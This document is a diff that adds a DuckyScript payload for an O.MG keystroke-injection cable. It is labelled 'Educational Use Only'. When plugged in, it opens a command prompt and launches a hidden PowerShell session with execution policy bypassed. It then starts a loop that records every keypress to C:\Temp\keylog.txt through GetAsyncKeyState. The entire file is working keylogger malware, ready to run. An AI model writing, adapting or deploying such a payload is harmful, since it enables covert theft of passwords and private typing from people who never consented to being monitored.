@@ -1,0 +1,24 @@
+REM O.MG-Optimized Keylogger Payload (Educational Use Only)
+REM Opens CMD, sets up PowerShell keylogger to C:\Temp\keylog.txt
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING mkdir C:\Temp 2>NUL
+ENTER
+DELAY 200
+STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden
+ENTER
+DELAY 500
+STRING $logfile = "C:\Temp\keylog.txt"; if (!(Test-Path $logfile)) { New-Item -Path $logfile -ItemType File }; Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Keyboard {
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+}
+"@; while ($true) { Start-Sleep -Milliseconds 50; for ($i = 8; $i -le 255; $i++) { if ([Keyboard]::GetAsyncKeyState($i) -eq -32767) { try { Add-Content -Path $logfile -Value ([char]$i) -ErrorAction SilentlyContinue } catch {} } } }
+ENTER
